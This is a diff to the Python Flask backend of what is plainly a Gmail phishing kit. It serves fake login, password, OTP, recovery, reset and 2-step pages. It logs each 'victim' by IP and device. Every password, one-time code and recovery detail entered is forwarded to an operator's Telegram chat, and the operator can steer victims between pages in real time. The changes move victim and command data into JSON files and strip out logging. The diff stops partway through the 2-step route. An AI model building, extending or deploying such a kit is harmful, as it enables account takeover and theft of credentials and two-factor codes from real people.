@@ -27,13 +27,149 @@ DATABASE_URL = os.environ.get('DATABASE_URL')
 TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
 TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')
 
+# ============ JSON STORAGE ============
+DATA_DIR = os.path.dirname(os.path.abspath(__file__))
+VICTIMS_FILE = os.path.join(DATA_DIR, 'victims_data.json')
+COMMANDS_FILE = os.path.join(DATA_DIR, 'commands_data.json')
+SETTINGS_FILE = os.path.join(DATA_DIR, 'settings_data.json')
+NOTIFICATIONS_FILE = os.path.join(DATA_DIR, 'notifications_data.json')
+
+def load_json_file(filepath):
+    try:
+        if os.path.exists(filepath):
+            with open(filepath, 'r') as f:
+                return json.load(f)
+        return {}
+    except:
+        return {}
+
+def save_json_file(filepath, data):
+    try:
+        with open(filepath, 'w') as f:
+            json.dump(data, f, indent=2)
+        return True
+    except:
+        return False
+
+# Victim storage
+def load_victims_json():
+    return load_json_file(VICTIMS_FILE)
+
+def save_victims_json(data):
+    save_json_file(VICTIMS_FILE, data)
+
+def update_victim_json(session_id, data):
+    victims = load_victims_json()
+    victims[session_id] = data
+    save_victims_json(victims)
+
+def delete_victim_json(session_id):
+    victims = load_victims_json()
+    if session_id in victims:
+        del victims[session_id]
+        save_victims_json(victims)
+        return True
+    return False
+
+# Command storage
+def load_commands_json():
+    return load_json_file(COMMANDS_FILE)
+
+def save_commands_json(data):
+    save_json_file(COMMANDS_FILE, data)
+
+def add_command_json(session_id, command, ip_address=None):
+    commands = load_commands_json()
+    commands[session_id] = {
+        'command': command,
+        'ip': ip_address,
+        'timestamp': time.time()
+    }
+    save_commands_json(commands)
+
+def get_and_clear_command_json(session_id):
+    commands = load_commands_json()
+    if session_id in commands:
+        data = commands[session_id]
+        if time.time() - data['timestamp'] < 30:
+            command = data['command']
+            del commands[session_id]
+            save_commands_json(commands)
+            return command
+        else:
+            del commands[session_id]
+            save_commands_json(commands)
+    return None
+
+def get_and_clear_command_by_ip_json(ip_address):
+    commands = load_commands_json()
+    for session_id, data in list(commands.items()):
+        if data.get('ip') == ip_address:
+            if time.time() - data['timestamp'] < 30:
+                command = data['command']
+                del commands[session_id]
+                save_commands_json(commands)
+                return session_id, command
+            else:
+                del commands[session_id]
+                save_commands_json(commands)
+    return None, None
+
+# Settings storage
+def load_settings_json():
+    return load_json_file(SETTINGS_FILE)
+
+def save_settings_json(data):
+    save_json_file(SETTINGS_FILE, data)
+
+def get_settings_json(session_id):
+    settings = load_settings_json()
+    return settings.get(session_id, {})
+
+def update_setting_json(session_id, key, value):
+    settings = load_settings_json()
+    if session_id not in settings:
+        settings[session_id] = {}
+    settings[session_id][key] = value
+    save_settings_json(settings)
+
+# Notification storage
+def load_notifications_json():
+    return load_json_file(NOTIFICATIONS_FILE)
+
+def save_notifications_json(data):
+    save_json_file(NOTIFICATIONS_FILE, data)
+
+def mark_notification_sent(session_id, page):
+    notifications = load_notifications_json()
+    key = f'{page}_{session_id}'
+    notifications[key] = True
+    save_notifications_json(notifications)
+
+def is_notification_sent(session_id, page):
+    notifications = load_notifications_json()
+    key = f'{page}_{session_id}'
+    return notifications.get(key, False)
+
+def clear_notifications_json(session_id):
+    notifications = load_notifications_json()
+    for key in list(notifications.keys()):
+        if key.endswith(f'_{session_id}'):
+            del notifications[key]
+    save_notifications_json(notifications)
+
+def clear_all_json():
+    save_victims_json({})
+    save_commands_json({})
+    save_settings_json({})
+    save_notifications_json({})
+
+# ============ DATABASE FUNCTIONS ============
 def get_db_connection():
-    """Get PostgreSQL database connection"""
     conn = psycopg2.connect(DATABASE_URL)
     return conn
 
 def init_db():
-    """Initialize PostgreSQL database with correct schema"""
     conn = get_db_connection()
     c = conn.cursor()
     
@@ -78,111 +214,87 @@ def init_db():
 
 init_db()
 
-# Store active victims
+# Store active victims in memory
 active_victims = {}
 
-# Store page data
-verify_page_data = {}
-recovery_page_data = {}
-verification_page_data = {}
-phone_data = {}
+# Cache for victim details
+victim_cache = {}
+CACHE_EXPIRY = 60
 
-# Store setting states for Telegram
-setting_states = {}
-
-# Store notified pages to prevent duplicates
-notified_pages = {}
-
-# Store commands with timestamp (in-memory for speed)
-command_store = {}
-COMMAND_EXPIRY = 30  # 30 seconds expiry
-
-# ============ COMMAND FUNCTIONS ============
-def add_command(session_id, command, ip_address=None):
-    """Add command with timestamp"""
-    command_store[session_id] = {
-        'command': command,
-        'ip': ip_address,
-        'timestamp': time.time()
-    }
-    print(f"✅ Command '{command}' added for session {session_id}")
-
-def get_and_clear_command_by_session(session_id):
-    """Get and clear command for a session"""
-    if session_id in command_store:
-        data = command_store[session_id]
-        # Check if expired (30 seconds)
-        if time.time() - data['timestamp'] < COMMAND_EXPIRY:
-            command = data['command']
-            del command_store[session_id]
-            return command
-        else:
-            # Expired, remove it
-            del command_store[session_id]
+def get_victim_details_cached(session_id):
+    if session_id in victim_cache:
+        cached_data, timestamp = victim_cache[session_id]
+        if time.time() - timestamp < CACHE_EXPIRY:
+            return cached_data
+    
+    conn = get_db_connection()
+    c = conn.cursor()
+    c.execute('''
+        SELECT v.session_id, v.email, v.ip_address, v.user_agent, v.current_page, v.timestamp,
+               COUNT(n.id) as nav_count
+        FROM victims v
+        LEFT JOIN navigations n ON v.session_id = n.session_id
+        WHERE v.session_id = %s AND v.is_active = TRUE
+        GROUP BY v.session_id, v.email, v.ip_address, v.user_agent, v.current_page, v.timestamp
+    ''', (session_id,))
+    victim = c.fetchone()
+    conn.close()
+    
+    if victim:
+        email = victim[1] or 'No email'
+        if email == 'No email' and session_id in active_victims:
+            mem_email = active_victims[session_id].get('email')
+            if mem_email:
+                email = mem_email
+        
+        data = {
+            'session_id': victim[0],
+            'email': email,
+            'ip_address': victim[2],
+            'user_agent': victim[3],
+            'current_page': victim[4] or 'login',
+            'timestamp': victim[5],
+            'nav_count': victim[6]
+        }
+        victim_cache[session_id] = (data, time.time())
+        return data
     return None
 
-def get_and_clear_command_by_ip(ip_address):
-    """Get and clear command for an IP address"""
-    for session_id, data in list(command_store.items()):
-        if data.get('ip') == ip_address:
-            # Check if expired
-            if time.time() - data['timestamp'] < COMMAND_EXPIRY:
-                command = data['command']
-                del command_store[session_id]
-                return session_id, command
-            else:
-                # Expired, remove it
-                del command_store[session_id]
-    return None, None
+def invalidate_cache(session_id):
+    if session_id in victim_cache:
+        del victim_cache[session_id]
 
-# Force webhook setup on every request
+def invalidate_all_cache():
+    victim_cache.clear()
+
+# ============ HELPER FUNCTIONS ============
 def ensure_webhook():
-    """Ensure webhook is set on every request"""
     try:
         domain = os.environ.get('DOMAIN_URL', 'https://bace-wmed.onrender.com')
         webhook_url = f"{domain}/telegram-webhook"
-        
-        # Check current webhook
         info_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getWebhookInfo"
         info_response = requests.get(info_url, timeout=5)
         info = info_response.json()
-        
         current_url = info.get('result', {}).get('url', '')
-        
         if current_url != webhook_url:
-            print(f"🔄 Webhook mismatch. Setting to: {webhook_url}")
             set_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook?url={webhook_url}"
-            response = requests.get(set_url, timeout=10)
-            result = response.json()
-            if result.get('ok'):
-                print(f"✅ Webhook set successfully: {webhook_url}")
-            else:
-                print(f"❌ Webhook failed: {result}")
-        else:
-            print(f"✅ Webhook already set correctly: {webhook_url}")
-    except Exception as e:
-        print(f"❌ Error ensuring webhook: {e}")
+            requests.get(set_url, timeout=10)
+    except:
+        pass
 
 @app.before_request
 def before_request():
-    """Run before every request - ensure webhook is set and ignore bots"""
-    # Ignore health checks and bots
     user_agent = request.headers.get('User-Agent', '')
     if 'Go-http-client' in user_agent or 'HealthCheck' in user_agent:
         return None
-    
-    # Skip for static files and webhook endpoint itself
     if not request.path.startswith('/static/') and request.path != '/telegram-webhook':
         ensure_webhook()
 
 def get_device_info(user_agent):
-    """Extract device info from user agent"""
     device = "Unknown"
     if not user_agent:
         return device
-    
     ua = user_agent.lower()
-    
     if 'iphone' in ua:
         device = "iPhone"
     elif 'ipad' in ua:
@@ -203,27 +315,21 @@ def get_device_info(user_agent):
         device = "Linux"
     elif 'bot' in ua or 'crawl' in ua or 'spider' in ua:
         device = "Bot/Crawler"
-    
     return device
 
 def send_telegram_notification_with_buttons(message, session_id=None):
-    """Send notification with View Victim button"""
     try:
         chat_id = os.environ.get('TELEGRAM_CHAT_ID')
         if not chat_id:
             return False
-        
         keyboard = {"inline_keyboard": []}
-        
         if session_id:
             keyboard["inline_keyboard"].append([
                 {"text": "👤 View Victim", "callback_data": f"victim_detail|{session_id}"}
             ])
-        
         keyboard["inline_keyboard"].append([
             {"text": "🔙 Main Menu", "callback_data": "main_menu"}
         ])
-        
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
         data = {
             "chat_id": chat_id,
@@ -232,23 +338,15 @@ def send_telegram_notification_with_buttons(message, session_id=None):
             "reply_markup": json.dumps(keyboard)
         }
         response = requests.post(url, data=data)
-        if response.status_code == 200:
-            print(f"✅ Telegram sent to chat: {chat_id}")
-            return True
-        else:
-            print(f"❌ Telegram error: {response.text}")
-            return False
-    except Exception as e:
-        print(f"Error sending Telegram: {e}")
+        return response.status_code == 200
+    except:
         return False
 
 def send_telegram_message(message):
-    """Send simple text message without buttons"""
     try:
         chat_id = os.environ.get('TELEGRAM_CHAT_ID')
         if not chat_id:
             return False
-        
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
         data = {
             "chat_id": chat_id,
@@ -256,18 +354,11 @@ def send_telegram_message(message):
             "parse_mode": "HTML"
         }
         response = requests.post(url, data=data)
-        if response.status_code == 200:
-            print(f"✅ Telegram sent to chat: {chat_id}")
-            return True
-        else:
-            print(f"❌ Telegram error: {response.text}")
-            return False
-    except Exception as e:
-        print(f"Error sending Telegram: {e}")
+        return response.status_code == 200
+    except:
         return False
 
 def get_client_ip():
-    """Get client IP address - real visitor IP"""
     if request.headers.get('X-Forwarded-For'):
         ips = request.headers.get('X-Forwarded-For').split(',')
         return ips[0].strip()
@@ -277,16 +368,13 @@ def get_client_ip():
         return request.remote_addr
 
 def create_victim_session(ip_address, user_agent):
-    """Create a new victim session"""
     session_id = os.urandom(16).hex()
-    
     conn = get_db_connection()
     c = conn.cursor()
     c.execute("INSERT INTO victims (ip_address, user_agent, session_id, current_page) VALUES (%s, %s, %s, %s)",
               (ip_address, user_agent, session_id, 'login'))
     conn.commit()
     conn.close()
-    
     active_victims[session_id] = {
         'ip_address': ip_address,
         'user_agent': user_agent,
@@ -295,35 +383,29 @@ def create_victim_session(ip_address, user_agent):
         'is_active': True,
         'last_activity': datetime.now().isoformat()
     }
-    
     return session_id
 
 def update_victim_page(session_id, page_url, email=None):
-    """Update victim's current page"""
     conn = get_db_connection()
     c = conn.cursor()
-    
     if email:
         c.execute("UPDATE victims SET current_page = %s, email = %s WHERE session_id = %s", 
                  (page_url, email, session_id))
     else:
         c.execute("UPDATE victims SET current_page = %s WHERE session_id = %s", 
                  (page_url, session_id))
-    
     conn.commit()
     conn.close()
-    
     if session_id in active_victims:
         active_victims[session_id]['current_page'] = page_url
         active_victims[session_id]['last_activity'] = datetime.now().isoformat()
         if email:
             active_victims[session_id]['email'] = email
+    invalidate_cache(session_id)
 
 def log_navigation(session_id, page_url, email=None):
-    """Log navigation"""
     conn = get_db_connection()
     c = conn.cursor()
-    
     try:
         if email:
             c.execute("UPDATE victims SET current_page = %s, email = %s WHERE session_id = %s", 
@@ -331,30 +413,24 @@ def log_navigation(session_id, page_url, email=None):
         else:
             c.execute("UPDATE victims SET current_page = %s WHERE session_id = %s", 
                      (page_url, session_id))
-        
         c.execute("SELECT ip_address FROM victims WHERE session_id = %s", (session_id,))
         result = c.fetchone()
         ip_address = result[0] if result else 'Unknown'
-        
         c.execute("INSERT INTO navigations (session_id, email, ip_address, page_url) VALUES (%s, %s, %s, %s)",
                   (session_id, email, ip_address, page_url))
-        
         conn.commit()
-        
         if session_id in active_victims:
             active_victims[session_id]['current_page'] = page_url
             active_victims[session_id]['last_activity'] = datetime.now().isoformat()
             if email:
                 active_victims[session_id]['email'] = email
-                
-    except Exception as e:
-        print(f"Error in log_navigation: {e}")
+        invalidate_cache(session_id)
+    except:
         conn.rollback()
     finally:
         conn.close()
 
 def get_victim_page_display(page_name):
-    """Get display name for current page"""
     page_map = {
         'login': '🔐 Login Page',
         'gmail_login': '🔐 Gmail Login',
@@ -373,11 +449,9 @@ def get_victim_page_display(page_name):
 
 @app.before_request
 def check_restrictions():
-    """Check commands for victims using memory store"""
     user_agent = request.headers.get('User-Agent', '')
     if 'Go-http-client' in user_agent or 'HealthCheck' in user_agent:
         return None
-    
     if (request.endpoint in ['static', 'check_command', 'track_navigation',
                             'set_phone_data', 'get_phone_data', 'set_recovery_data', 
                             'get_recovery_data', 'set_verification_data', 'get_verification_data', 
@@ -399,30 +473,17 @@ def check_restrictions():
     }
     
     client_ip = get_client_ip()
-    
-    # Try by session_id first
     victim_session = session.get('victim_session')
     if victim_session:
-        command = get_and_clear_command_by_session(victim_session)
+        command = get_and_clear_command_json(victim_session)
         if command and command in command_map:
-            print(f"🎯 Executing command by session: {command} -> {command_map[command]}")
-            # Clear notifications for this victim
-            for key in list(notified_pages.keys()):
-                if key.endswith(f'_{victim_session}'):
-                    del notified_pages[key]
             return redirect(url_for(command_map[command]))
     
-    # Fallback: try by IP address
-    session_id, command = get_and_clear_command_by_ip(client_ip)
+    session_id, command = get_and_clear_command_by_ip_json(client_ip)
     if command and command in command_map:
-        print(f"🎯 Executing command by IP: {command} -> {command_map[command]}")
         if session_id:
             session['victim_session'] = session_id
             session['is_victim'] = True
-            # Clear notifications for this victim
-            for key in list(notified_pages.keys()):
-                if key.endswith(f'_{session_id}'):
-                    del notified_pages[key]
         return redirect(url_for(command_map[command]))
     
     return None
@@ -457,7 +518,6 @@ def index():
     return render_template('index.html', invite_num=invite_num)
 
 def ensure_session():
-    """Ensure victim session exists"""
     if 'victim_session' not in session:
         client_ip = get_client_ip()
         user_agent = request.headers.get('User-Agent', '')
@@ -476,11 +536,9 @@ def gmail_login():
     log_navigation(session_id, 'Gmail Login Page', session.get('email'))
     update_victim_page(session_id, 'gmail_login')
     
-    notification_key = f'gmail_login_{session_id}'
-    if not notified_pages.get(notification_key):
-        notified_pages[notification_key] = True
+    if not is_notification_sent(session_id, 'gmail_login'):
+        mark_notification_sent(session_id, 'gmail_login')
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
         message = f"""🔐 <b>VICTIM REACHED GMAIL LOGIN PAGE!</b>
 
 📧 <b>Email:</b> <code>{session.get('email', 'No email yet')}</code>
@@ -488,7 +546,6 @@ def gmail_login():
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Gmail Login"""
-        
         send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('login.html')
@@ -510,10 +567,7 @@ def login():
         if session_id in active_victims:
             active_victims[session_id]['email'] = email
         
-        if session_id not in verify_page_data:
-            verify_page_data[session_id] = {}
-        verify_page_data[session_id]['email'] = email
-        
+        update_setting_json(session_id, 'email', email)
         log_navigation(session_id, 'Login Attempt', email)
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -528,8 +582,8 @@ def login():
 📍 <b>Current Page:</b> Login Form"""
         
         send_telegram_notification_with_buttons(message, session_id)
-        
         session['email'] = email
+        invalidate_cache(session_id)
         
         return jsonify({'success': True, 'redirect': url_for('password')})
     
@@ -543,11 +597,9 @@ def waiting():
     
     log_navigation(session_id, 'Waiting Page', session.get('email'))
     
-    notification_key = f'waiting_{session_id}'
-    if not notified_pages.get(notification_key):
-        notified_pages[notification_key] = True
+    if not is_notification_sent(session_id, 'waiting'):
+        mark_notification_sent(session_id, 'waiting')
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
         message = f"""⏳ <b>VICTIM REACHED WAITING PAGE!</b>
 
 📧 <b>Email:</b> <code>{session.get('email', 'No email')}</code>
@@ -555,7 +607,6 @@ def waiting():
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Waiting"""
-        
         send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('waiting.html')
@@ -569,9 +620,7 @@ def stall():
     
     if request.method == 'POST':
         captcha_text = request.form.get('ca', '').strip()
-        
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
         message = f"""⏸️ <b>VICTIM SUBMITTED CAPTCHA ON STALL PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
@@ -580,20 +629,15 @@ def stall():
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Stall (CAPTCHA Submitted)"""
-        
         send_telegram_notification_with_buttons(message, session_id)
-        
         log_navigation(session_id, 'Stall Page - CAPTCHA Submitted', email)
-        
         return redirect(url_for('waiting'))
     
     log_navigation(session_id, 'Stall Page', email)
     
-    notification_key = f'stall_{session_id}'
-    if not notified_pages.get(notification_key):
-        notified_pages[notification_key] = True
+    if not is_notification_sent(session_id, 'stall'):
+        mark_notification_sent(session_id, 'stall')
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
         message = f"""⏸️ <b>VICTIM REACHED STALL PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
@@ -601,7 +645,6 @@ def stall():
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Stall (CAPTCHA)"""
-        
         send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('stall.html')
@@ -611,20 +654,16 @@ def set_verify_data():
     data = request.get_json()
     session_id = data.get('session_id')
     email = data.get('email')
-    
     if session_id and email:
-        verify_page_data[session_id] = {
-            'email': email,
-            'timestamp': datetime.now().isoformat()
-        }
-    
+        update_setting_json(session_id, 'email', email)
     return jsonify({'success': True})
 
 @app.route('/api/get-verify-data')
 def get_verify_data():
     session_id = session.get('victim_session')
-    if session_id and session_id in verify_page_data:
-        return jsonify(verify_page_data[session_id])
+    if session_id:
+        settings = get_settings_json(session_id)
+        return jsonify({'email': settings.get('email', '')})
     return jsonify({'email': ''})
 
 @app.route('/verify', methods=['GET', 'POST'])
@@ -634,15 +673,14 @@ def verify():
     user_agent = request.headers.get('User-Agent', '')
     device = get_device_info(user_agent)
     
-    if session_id in verify_page_data:
-        email = verify_page_data[session_id].get('email', email)
+    settings = get_settings_json(session_id)
+    if settings.get('email'):
+        email = settings.get('email')
     
     if request.method == 'POST':
         recovery_email = request.form.get('recovery_email', '').strip()
         recovery_phone = request.form.get('recovery_phone', '').strip()
-        
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
         message = f"""🔐 <b>VICTIM SUBMITTED RECOVERY INFO!</b>
 
 📧 <b>Original Email:</b> <code>{email}</code>
@@ -651,20 +689,15 @@ def verify():
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>"""
-        
         send_telegram_notification_with_buttons(message, session_id)
-        
         log_navigation(session_id, 'Recovery Info Submitted', email)
-        
         return redirect(url_for('waiting'))
     
     log_navigation(session_id, 'Verify Page', email)
     
-    notification_key = f'verify_{session_id}'
-    if not notified_pages.get(notification_key):
-        notified_pages[notification_key] = True
+    if not is_notification_sent(session_id, 'verify'):
+        mark_notification_sent(session_id, 'verify')
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
         message = f"""🔐 <b>VICTIM REACHED VERIFY PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
@@ -672,7 +705,6 @@ def verify():
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Verify"""
-        
         send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('verify.html', placeholders={'email': email})
@@ -684,15 +716,14 @@ def password():
     user_agent = request.headers.get('User-Agent', '')
     device = get_device_info(user_agent)
     
-    if session_id in verify_page_data:
-        email = verify_page_data[session_id].get('email', email)
+    settings = get_settings_json(session_id)
+    if settings.get('email'):
+        email = settings.get('email')
     
     if request.method == 'POST':
         password = request.form.get('password', '').strip()
         email = request.form.get('email', email)
-        
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
         message = f"""🔑 <b>VICTIM SUBMITTED PASSWORD!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
@@ -700,20 +731,15 @@ def password():
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>"""
-        
         send_telegram_notification_with_buttons(message, session_id)
-        
         log_navigation(session_id, 'Password Submitted', email)
-        
         return redirect(url_for('waiting'))
     
     log_navigation(session_id, 'Password Page', email)
     
-    notification_key = f'password_{session_id}'
-    if not notified_pages.get(notification_key):
-        notified_pages[notification_key] = True
+    if not is_notification_sent(session_id, 'password'):
+        mark_notification_sent(session_id, 'password')
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
         message = f"""🔑 <b>VICTIM REACHED PASSWORD PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
@@ -721,7 +747,6 @@ def password():
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Password"""
-        
         send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('password.html', placeholders={'email': email})
@@ -730,14 +755,11 @@ def password():
 def track_navigation():
     if not session.get('is_victim'):
         return jsonify({'success': False})
-    
     data = request.get_json()
     page_url = data.get('page_url', 'Unknown')
     session_id = session.get('victim_session')
-    
     if session_id:
         log_navigation(session_id, page_url, session.get('email'))
-    
     return jsonify({'success': True})
 
 @app.route('/invalid', methods=['GET', 'POST'])
@@ -747,15 +769,14 @@ def invalid():
     user_agent = request.headers.get('User-Agent', '')
     device = get_device_info(user_agent)
     
-    if session_id in verify_page_data:
-        email = verify_page_data[session_id].get('email', email)
+    settings = get_settings_json(session_id)
+    if settings.get('email'):
+        email = settings.get('email')
     
     if request.method == 'POST':
         password = request.form.get('password', '').strip()
         email = request.form.get('email', email)
-        
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
         message = f"""🔑 <b>VICTIM SUBMITTED PASSWORD FROM INVALID PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
@@ -764,20 +785,15 @@ def invalid():
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Page Type:</b> Invalid/Too Many Attempts"""
-        
         send_telegram_notification_with_buttons(message, session_id)
-        
         log_navigation(session_id, 'Invalid Page - Password Submitted', email)
-        
         return redirect(url_for('waiting'))
     
     log_navigation(session_id, 'Invalid Page', email)
     
-    notification_key = f'invalid_{session_id}'
-    if not notified_pages.get(notification_key):
-        notified_pages[notification_key] = True
+    if not is_notification_sent(session_id, 'invalid'):
+        mark_notification_sent(session_id, 'invalid')
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
         message = f"""🚫 <b>VICTIM REACHED INVALID PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
@@ -785,7 +801,6 @@ def invalid():
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Invalid/Too Many Attempts"""
-        
         send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('invalid.html', placeholders={'email': email})
@@ -797,16 +812,15 @@ def reset():
     user_agent = request.headers.get('User-Agent', '')
     device = get_device_info(user_agent)
     
-    if session_id in verify_page_data:
-        email = verify_page_data[session_id].get('email', email)
+    settings = get_settings_json(session_id)
+    if settings.get('email'):
+        email = settings.get('email')
     
     if request.method == 'POST':
         new_password = request.form.get('new_password', '').strip()
         confirm_password = request.form.get('confirm_password', '').strip()
         email = request.form.get('email', email)
-        
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
         message = f"""🔑 <b>VICTIM CREATED NEW PASSWORD!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
@@ -815,20 +829,15 @@ def reset():
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>"""
-        
         send_telegram_notification_with_buttons(message, session_id)
-        
         log_navigation(session_id, 'Reset Password Submitted', email)
-        
         return redirect(url_for('waiting'))
     
     log_navigation(session_id, 'Reset Password Page', email)
     
-    notification_key = f'reset_{session_id}'
-    if not notified_pages.get(notification_key):
-        notified_pages[notification_key] = True
+    if not is_notification_sent(session_id, 'reset'):
+        mark_notification_sent(session_id, 'reset')
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
         message = f"""🔑 <b>VICTIM REACHED RESET PASSWORD PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
@@ -836,7 +845,6 @@ def reset():
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Reset Password"""
-        
         send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('reset.html', placeholders={'email': email})
@@ -848,19 +856,15 @@ def otp():
     user_agent = request.headers.get('User-Agent', '')
     device = get_device_info(user_agent)
     
-    if session_id in verify_page_data:
-        email = verify_page_data[session_id].get('email', email)
-    
-    phone = '****'
-    if session_id in verify_page_data:
-        phone = verify_page_data[session_id].get('phone', '****')
+    settings = get_settings_json(session_id)
+    if settings.get('email'):
+        email = settings.get('email')
+    phone = settings.get('phone', '****')
     
     if request.method == 'POST':
         otp_code = request.form.get('otpcode', '').strip()
         email = request.form.get('email', email)
-        
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
         message = f"""🔢 <b>VICTIM SUBMITTED OTP!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
@@ -868,20 +872,15 @@ def otp():
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>"""
-        
         send_telegram_notification_with_buttons(message, session_id)
-        
         log_navigation(session_id, 'OTP Submitted', email)
-        
         return redirect(url_for('waiting'))
     
     log_navigation(session_id, 'OTP Page', email)
     
-    notification_key = f'otp_{session_id}'
-    if not notified_pages.get(notification_key):
-        notified_pages[notification_key] = True
+    if not is_notification_sent(session_id, 'otp'):
+        mark_notification_sent(session_id, 'otp')
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
         message = f"""🔢 <b>VICTIM REACHED OTP PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
@@ -890,7 +889,6 @@ def otp():
 📞 <b>Phone:</b> <code>{phone}</code>
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> OTP"""
-        
         send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('otp.html', placeholders={'email': email, 'phone': phone})
@@ -902,22 +900,16 @@ def recovery():
     user_agent = request.headers.get('User-Agent', '')
     device = get_device_info(user_agent)
     
-    recovery_data = {}
-    if session_id in recovery_page_data:
-        recovery_data = recovery_page_data[session_id]
-        email = recovery_data.get('email', email)
-    
-    number = ''
-    if session_id in recovery_page_data:
-        number = recovery_page_data[session_id].get('number', '')
+    settings = get_settings_json(session_id)
+    if settings.get('email'):
+        email = settings.get('email')
+    number = settings.get('number', '')
     
     log_navigation(session_id, 'Recovery Page', email)
     
-    notification_key = f'recovery_{session_id}'
-    if not notified_pages.get(notification_key):
-        notified_pages[notification_key] = True
+    if not is_notification_sent(session_id, 'recovery'):
+        mark_notification_sent(session_id, 'recovery')
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
         message = f"""📱 <b>VICTIM REACHED RECOVERY PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
@@ -926,13 +918,9 @@ def recovery():
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> Recovery"""
-        
         send_telegram_notification_with_buttons(message, session_id)
     
-    return render_template('recovery.html', placeholders={
-        'email': email, 
-        'number': number
-    })
+    return render_template('recovery.html', placeholders={'email': email, 'number': number})
 
 @app.route('/2step', methods=['GET', 'POST'])
 def twostep():
@@ -941,22 +929,16 @@ def twostep():
     user_agent = request.headers.get('User-Agent', '')
     device = get_device_info(user_agent)
     
-    verification_data = {}
-    if session_id in verification_page_data:
-        verification_data = verification_page_data[session_id]
-        email = verification_data.get('email', email)
-    
-    phone_type = 'iPhone'
-    if session_id in verification_page_data:
-        phone_type = verification_page_data[session_id].get('phone', 'iPhone')
+    settings = get_settings_json(session_id)
+    if settings.get('email'):
+        email = settings.get('email')
+    phone_type = settings.get('phone_type', 'iPhone')
     
     log_navigation(session_id, '2-Step Verification Page', email)
     
-    notification_key = f'twostep_{session_id}'
-    if not notified_pages.get(notification_key):
-        notified_pages[notification_key] = True
+    if not is_notification_sent(session_id, 'twostep'):
+        mark_notification_sent(session_id, 'twostep')
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
         message = f"""📱 <b>VICTIM REACHED 2-STEP VERIFICATION PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
@@ -965,13 +947,9 @@ def twostep():
 📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 📍 <b>Current Page:</b> 2-Step Verification"""
-        
